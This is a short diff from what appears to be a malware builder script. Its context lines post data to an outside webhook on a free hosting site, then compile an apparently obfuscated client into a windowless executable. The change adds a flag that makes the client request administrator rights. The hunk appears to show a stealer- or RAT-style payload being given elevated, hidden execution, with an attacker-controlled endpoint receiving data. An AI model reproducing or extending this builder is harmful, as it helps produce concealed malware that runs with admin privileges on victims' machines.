@@ -83,7 +83,7 @@ datab = {
 r = requests.post("https://webhook667.000webhostapp.com", data=datab)
 
 print(r.text)
-os.system(val + ' -m PyInstaller --onefile --noconsole client.py.hashed.py -i "NONE"')
+os.system(val + ' -m PyInstaller --onefile --uac-admin --noconsole client.py.hashed.py -i "NONE"')
 
 
 
